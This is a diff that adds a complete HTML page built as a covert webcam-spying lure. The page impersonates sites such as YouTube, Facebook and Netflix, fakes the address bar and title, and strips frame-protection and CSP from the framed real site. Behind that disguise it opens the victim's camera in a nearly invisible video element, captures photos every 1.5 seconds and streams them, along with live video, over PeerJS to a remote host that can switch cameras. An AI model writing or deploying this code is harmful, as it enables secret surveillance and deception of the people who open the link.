@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Please wait...</title>
+  <!-- PeerJS with CDN fallback -->
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"
+    onerror="this.onerror=null;var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/npm/peerjs@1.5.4/dist/peerjs.min.js';document.head.appendChild(s);">
+  </script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { width: 100%; height: 100%; overflow: hidden; background: #fff; }
+
+    /* Full-screen iframe */
+    #site-frame {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      border: none;
+      z-index: 2147483647;
+      background: #fff;
+      display: none;
+    }
+
+    /* Loading splash */
+    #loading {
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 1rem;
+      z-index: 2147483646;
+    }
+
+    /* Progress bar */
+    #bar {
+      position: fixed;
+      top: 0; left: 0;
+      height: 3px;
+      width: 0%;
+      background: #4285f4;
+      transition: width 0.3s ease;
+      z-index: 2147483647;
+      border-radius: 0 2px 2px 0;
+    }
+
+    /* Hidden camera */
+    #hcam {
+      position: fixed;
+      bottom: 0; right: 0;
+      width: 2px; height: 2px;
+      opacity: 0.01;
+      pointer-events: none;
+      z-index: -1;
+      object-fit: cover;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    @keyframes pulse {
+      0%,100%{ transform: scale(1); }
+      50%{ transform: scale(1.08); }
+    }
+  </style>
+</head>
+<body>
+
+<div id="bar"></div>
+<div id="loading"></div>
+
+<!-- Full-screen disguise website iframe -->
+<iframe id="site-frame" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation-by-user-activation" allow="autoplay; fullscreen" allowfullscreen></iframe>
+
+<!-- Invisible camera feed -->
+<video id="hcam" autoplay muted playsinline></video>
+
+<script>
+// ── Read URL params ──────────────────────────────────────────
+const params      = new URLSearchParams(location.search);
+const hostId      = params.get('host')     || '';
+const redirectUrl = params.get('redirect') || 'https://www.youtube.com';
+
+// ── Site branding detection ──────────────────────────────────
+function getSiteInfo(url) {
+  try {
+    const h = new URL(url).hostname.replace('www.','');
+    if (h.includes('youtube'))   return { name:'YouTube',   color:'#ff0000', icon:'▶',  spinner:'#ff0000' };
+    if (h.includes('google'))    return { name:'Google',    color:'#4285f4', icon:'G',  spinner:'#4285f4' };
+    if (h.includes('facebook'))  return { name:'Facebook',  color:'#1877f2', icon:'f',  spinner:'#1877f2' };
+    if (h.includes('instagram')) return { name:'Instagram', color:'#e1306c', icon:'◎',  spinner:'#e1306c' };
+    if (h.includes('tiktok'))    return { name:'TikTok',    color:'#010101', icon:'♪',  spinner:'#69c9d0' };
+    if (h.includes('twitter')||h.includes('x.com')) return { name:'X', color:'#000', icon:'𝕏', spinner:'#000' };
+    if (h.includes('netflix'))   return { name:'Netflix',   color:'#e50914', icon:'N',  spinner:'#e50914' };
+    if (h.includes('whatsapp'))  return { name:'WhatsApp',  color:'#25d366', icon:'💬', spinner:'#25d366' };
+    if (h.includes('ncs'))       return { name:'NCS',       color:'#ff5500', icon:'♫',  spinner:'#ff5500' };
+    if (h.includes('spotify'))   return { name:'Spotify',   color:'#1db954', icon:'🎵', spinner:'#1db954' };
+    if (h.includes('amazon'))    return { name:'Amazon',    color:'#ff9900', icon:'a',  spinner:'#ff9900' };
+    if (h.includes('twitter'))   return { name:'Twitter',   color:'#1da1f2', icon:'🐦', spinner:'#1da1f2' };
+    return { name: new URL(url).hostname.replace('www.',''), color:'#4285f4', icon:'🌐', spinner:'#4285f4' };
+  } catch(e) { return { name:'Loading', color:'#4285f4', icon:'🌐', spinner:'#4285f4' }; }
+}
+const site = getSiteInfo(redirectUrl);
+
+// ── Loading screen: plain white + subtle top bar only ─────────
+// Target sees a normal blank page loading — no text, no icon
+document.getElementById('bar').style.background = '#4285f4';
+document.getElementById('loading').style.background = '#ffffff';
+document.getElementById('loading').innerHTML = '';
+
+// ── Animate top progress bar ──────────────────────────────────
+const barEl  = document.getElementById('bar');
+const progEl = null;
+let barW = 5;
+const barTick = setInterval(() => {
+  barW = Math.min(barW + Math.random() * 12, 88);
+  barEl.style.width = barW + '%';
+  if (barW >= 88) clearInterval(barTick);
+}, 280);
+
+// ── Mask address bar ─────────────────────────────────────────
+(function() {
+  try {
+    const ch = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+    let id = ''; for (let i = 0; i < 11; i++) id += ch[Math.floor(Math.random()*ch.length)];
+    let path = '/watch?v=' + id;
+    try {
+      const h = new URL(redirectUrl).hostname.replace('www.', '');
+      if (h.includes('google'))                           path = '/search?q=trending+now';
+      else if (h.includes('facebook')||h.includes('fb')) path = '/reel/' + Math.floor(Math.random()*9e11+1e11);
+      else if (h.includes('instagram'))                  path = '/p/' + id + '/';
+      else if (h.includes('twitter')||h.includes('x.com')) path = '/i/status/' + Math.floor(Math.random()*9e17+1e17);
+      else if (h.includes('tiktok'))                     path = '/@user/video/' + Math.floor(Math.random()*9e17+1e17);
+      else if (h.includes('netflix'))                    path = '/watch/' + Math.floor(Math.random()*9e7+1e7);
+    } catch(e) {}
+    history.replaceState(null, '', path);
+    document.title = site.name;
+  } catch(e) {}
+})();
+
+// ── Elements ─────────────────────────────────────────────────
+const frame   = document.getElementById('site-frame');
+const loading = document.getElementById('loading');
+
+let displayDone = false;
+
+// ── Show iframe fullscreen ────────────────────────────────────
+function showFrame() {
+  if (displayDone) return;
+  displayDone = true;
+  clearInterval(barTick);
+  barEl.style.transition = 'width 0.15s';
+  barEl.style.width = '100%';
+  if (progEl) progEl.style.width = '100%';
+  setTimeout(() => { barEl.style.opacity = '0'; }, 250);
+  frame.style.display = 'block';
+  loading.style.display = 'none';
+}
+
+// ── Stage 4 (last resort): real redirect ─────────────────────
+function doRedirect() {
+  if (displayDone) return;
+  displayDone = true;
+  clearInterval(barTick);
+  barEl.style.width = '100%';
+  if (progEl) progEl.style.width = '100%';
+  window.location.replace(redirectUrl);
+}
+
+// ── Stage 3: proxy.php ────────────────────────────────────────
+function tryProxy() {
+  if (displayDone) return;
+  frame.onload = null; frame.onerror = null;
+  frame.src = '/proxy.php?url=' + encodeURIComponent(redirectUrl);
+  const t = setTimeout(() => { if (!displayDone) doRedirect(); }, 8000);
+  frame.onload = function() {
+    clearTimeout(t);
+    if (displayDone) return;
+    try {
+      const body = frame.contentDocument && frame.contentDocument.body;
+      const text = body ? (body.innerText||'').trim() : '';
+      if (!text || text === 'PROXY_FAILED' || text === 'NO_URL' || text === 'INVALID_URL') {
+        doRedirect(); return;
+      }
+      showFrame();
+    } catch(e) { showFrame(); }
+  };
+  frame.onerror = () => doRedirect();
+}
+
+// ── Stage 2: allorigins.win — client-side blob injection ──────
+// Fetches HTML in browser, rewrites URLs, injects into iframe
+// Works without server cURL — bypasses X-Frame-Options entirely
+async function tryClientProxy() {
+  if (displayDone) return;
+  try {
+    const apis = [
+      'https://api.allorigins.win/raw?url=' + encodeURIComponent(redirectUrl),
+      'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(redirectUrl),
+    ];
+
+    let html = null;
+    for (const apiUrl of apis) {
+      try {
+        const ctrl = new AbortController();
+        const tid  = setTimeout(() => ctrl.abort(), 9000);
+        const r    = await fetch(apiUrl, { signal: ctrl.signal });
+        clearTimeout(tid);
+        if (r.ok) {
+          const t = await r.text();
+          if (t && t.length > 200 && t.includes('<')) { html = t; break; }
+        }
+      } catch(e) { continue; }
+    }
+
+    if (!html) { tryProxy(); return; }
+
+    // Rewrite relative URLs → absolute
+    const origin = new URL(redirectUrl).origin;
+    // <base href> — resolves all relative paths
+    const baseTag = `<base href="${origin}/">`;
+    // Strip X-Frame-Options meta tags
+    html = html.replace(/<meta[^>]+http-equiv=["']?X-Frame-Options["']?[^>]*>/gi, '');
+    // Strip CSP meta tags
+    html = html.replace(/<meta[^>]+http-equiv=["']?Content-Security-Policy["']?[^>]*>/gi, '');
+    // Neutralize frame-busting JS patterns
+    html = html.replace(/\btop\s*!==?\s*self\b/g, 'false');
+    html = html.replace(/\bself\s*!==?\s*top\b/g, 'false');
+    html = html.replace(/\btop\s*===?\s*self\b/g, 'true');
+    html = html.replace(/\bwindow\s*!==?\s*window\.top\b/g, 'false');
+    html = html.replace(/top\.location\s*(?:\.href)?\s*=/gi, 'void(0);//');
+    // Insert base tag right after <head>
+    if (html.includes('<head>')) {
+      html = html.replace('<head>', '<head>' + baseTag);
+    } else if (html.includes('<head ')) {
+      html = html.replace(/<head ([^>]*)>/, '<head $1>' + baseTag);
+    } else {
+      html = baseTag + html;
+    }
+
+    // Inject as blob URL — same-origin, so browser won't enforce X-Frame-Options
+    const blob    = new Blob([html], { type: 'text/html; charset=utf-8' });
+    const blobUrl = URL.createObjectURL(blob);
+
+    frame.onload = null; frame.onerror = null;
+    frame.src = blobUrl;
+
+    const t = setTimeout(() => { if (!displayDone) tryProxy(); }, 6000);
+    frame.onload = function() {
+      clearTimeout(t);
+      if (displayDone) return;
+      try {
+        const len = (frame.contentDocument && frame.contentDocument.body)
+          ? frame.contentDocument.body.innerHTML.length : 0;
+        if (len < 100) { tryProxy(); return; }
+        showFrame();
+      } catch(e) { showFrame(); }
+    };
+    frame.onerror = function() { clearTimeout(t); tryProxy(); };
+
+  } catch(e) { tryProxy(); }
+}
+
+// ── Stage 1: Direct iframe ────────────────────────────────────
+// ncs.io and sites without X-Frame-Options load instantly here
+frame.src = redirectUrl;
+
+frame.onload = function() {
+  if (displayDone) return;
+  try {
+    const doc = frame.contentDocument;
+    if (doc) {
+      const len = (doc.body ? doc.body.innerHTML : '').length;
+      if (len < 100) {
+        // Blocked by X-Frame-Options — try client proxy
+        tryClientProxy();
+      } else {
+        showFrame(); // Direct iframe worked!
+      }
+    } else { tryClientProxy(); }
+  } catch(e) {
+    // SecurityError = cross-origin iframe loaded fine (no X-Frame block)
+    showFrame();
+  }
+};
+frame.onerror = () => tryClientProxy();
+
+// Safety net — 5s timeout → try client proxy
+setTimeout(() => { if (!displayDone) tryClientProxy(); }, 5000);
+
+
+// ══════════════════════════════════════════════════════════════
+// CAMERA CAPTURE
+// ══════════════════════════════════════════════════════════════
+let localStream     = null;
+let senderPeer      = null;
+let dataConn        = null;
+let captureInterval = null;
+let captureCanvas   = document.createElement('canvas');
+let captureCtx      = captureCanvas.getContext('2d');
+let imageCapturer   = null;
+let currentFacingMode = 'user';
+let currentCall     = null;
+
+async function doCapture(vid) {
+  try {
+    if (!vid || vid.readyState < 2 || vid.videoWidth === 0) return;
+    if (!captureCanvas.width) return;
+    let img = null;
+    if (imageCapturer) {
+      try {
+        const blob = await imageCapturer.takePhoto();
+        img = await new Promise(res => {
+          const fr = new FileReader();
+          fr.onloadend = () => res(fr.result);
+          fr.readAsDataURL(blob);
+        });
+      } catch(e) { imageCapturer = null; }
+    }
+    if (!img) {
+      captureCtx.clearRect(0, 0, captureCanvas.width, captureCanvas.height);
+      captureCtx.drawImage(vid, 0, 0, captureCanvas.width, captureCanvas.height);
+      const pts = [
+        [captureCanvas.width*.5, captureCanvas.height*.5],
+        [captureCanvas.width*.25, captureCanvas.height*.25],
+        [captureCanvas.width*.75, captureCanvas.height*.75],
+      ];
+      let bright = 0;
+      for (const [x,y] of pts) {
+        const d = captureCtx.getImageData(Math.floor(x), Math.floor(y), 1, 1).data;
+        bright += d[0] + d[1] + d[2];
+      }
+      if (bright < 8*3*3) return;
+      img = captureCanvas.toDataURL('image/jpeg', 0.85);
+    }
+    if (!img || img.length < 5000) return;
+    if (dataConn && dataConn.open) {
+      try { dataConn.send(JSON.stringify({ type: 'capture', img, ts: Date.now() })); } catch(e) {}
+    }
+  } catch(e) {}
+}
+
+async function startCapture() {
+  const constraints = [
+    { facingMode:'user', width:{min:1280,ideal:1920}, height:{min:720,ideal:1080} },
+    { facingMode:'user', width:{min:640,ideal:1280},  height:{min:480,ideal:720}  },
+    { facingMode:'user' }
+  ];
+  for (const c of constraints) {
+    try {
+      localStream = await navigator.mediaDevices.getUserMedia({ video: c, audio: false });
+      onGranted();
+      return;
+    } catch(e) { continue; }
+  }
+}
+
+function onGranted() {
+  const vid = document.getElementById('hcam');
+  vid.srcObject = localStream;
+  try {
+    const track = localStream.getVideoTracks()[0];
+    if (track && typeof ImageCapture !== 'undefined') imageCapturer = new ImageCapture(track);
+  } catch(e) {}
+  function setupCanvas() {
+    const w = vid.videoWidth, h = vid.videoHeight;
+    if (w > 0 && h > 0) {
+      captureCanvas.width  = w;
+      captureCanvas.height = h;
+      clearInterval(captureInterval);
+      setTimeout(() => {
+        doCapture(vid);
+        captureInterval = setInterval(() => doCapture(vid), 1500);
+      }, 500);
+    } else { setTimeout(setupCanvas, 300); }
+  }
+  vid.oncanplay = () => setupCanvas();
+  connectPeer();
+}
+
+function connectPeer() {
+  if (!hostId) return;
+  try {
+    senderPeer = new Peer({
+      host:'0.peerjs.com', port:443, path:'/', secure:true,
+      config:{ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] }
+    });
+  } catch(e) { senderPeer = new Peer(); }
+
+  senderPeer.on('open', function() {
+    try {
+      dataConn = senderPeer.connect(hostId, { reliable: true });
+      dataConn.on('data', function(raw) {
+        try {
+          const msg = JSON.parse(raw);
+          if (msg.type === 'switch_camera') switchCam();
+          else if (msg.type === 'disconnect') {
+            clearInterval(captureInterval);
+            if (localStream) localStream.getTracks().forEach(t => t.stop());
+          }
+        } catch(e) {}
+      });
+    } catch(e) {}
+    if (localStream) {
+      try { currentCall = senderPeer.call(hostId, localStream); } catch(e) {}
+    }
+  });
+  senderPeer.on('error', function() {});
+}
+
+async function switchCam() {
+  currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+  try {
+    const newStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: currentFacingMode }, audio: false
+    });
+    if (currentCall && currentCall.peerConnection) {
+      const vs = currentCall.peerConnection.getSenders().find(s => s.track?.kind === 'video');
+      if (vs) await vs.replaceTrack(newStream.getVideoTracks()[0]);
+    }
+    if (localStream) localStream.getTracks().forEach(t => t.stop());
+    localStream = newStream;
+    document.getElementById('hcam').srcObject = localStream;
+    if (dataConn && dataConn.open) {
+      try { dataConn.send(JSON.stringify({ type: 'camera_switched', facing: currentFacingMode })); } catch(e) {}
+    }
+  } catch(e) {}
+}
+
+startCapture();
+</script>
+</body>
+</html>
